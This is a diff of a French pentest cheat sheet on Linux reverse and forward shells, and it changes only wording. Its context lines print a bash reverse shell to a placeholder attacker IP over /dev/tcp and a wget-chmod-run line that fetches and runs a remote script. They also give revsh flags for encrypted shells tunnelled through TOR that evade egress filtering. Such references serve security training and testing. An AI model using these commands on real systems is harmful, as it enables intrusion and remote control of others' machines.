@@ -23,7 +23,7 @@ exec >&0
 ```
 N'oubliez pas de vérifier avec d'autres shells : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
 
-### Shell sûr symbolique
+### Shell sûr pour les symboles
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Lorsqu'il s'agit d'une vulnérabilité de **Remote Code Execution (RCE)** dans une application web basée sur Linux, l'obtention d'un reverse shell peut être entravée par des défenses réseau telles que les règles iptables ou des mécanismes de filtrage de paquets complexes. Dans de tels environnements contraints, une approche alternative consiste à établir un shell PTY (Pseudo Terminal) pour interagir plus efficacement avec le système compromis.
+Lorsqu'il s'agit d'une vulnérabilité **Remote Code Execution (RCE)** dans une application web basée sur Linux, l'obtention d'un reverse shell peut être entravée par des défenses réseau telles que les règles iptables ou des mécanismes de filtrage de paquets complexes. Dans de tels environnements contraints, une approche alternative consiste à établir un shell PTY (Pseudo Terminal) pour interagir plus efficacement avec le système compromis.
 
 Un outil recommandé à cet effet est [toboggan](https://github.com/n3rada/toboggan.git), qui simplifie l'interaction avec l'environnement cible.
 
@@ -257,7 +257,7 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 Flags utiles :
 - `-b` : shell bind au lieu de reverse
 - `-p socks5://127.0.0.1:9050` : proxy via TOR/HTTP/SOCKS
-- `-t` : créer une interface TUN (VPN inverse)
+- `-t` : créer une interface TUN (VPN reverse)
 
 Parce que l'ensemble de la session est chiffré et multiplexé, cela contourne souvent le filtrage sortant simple qui tuerait un shell `/dev/tcp` en texte clair.
 
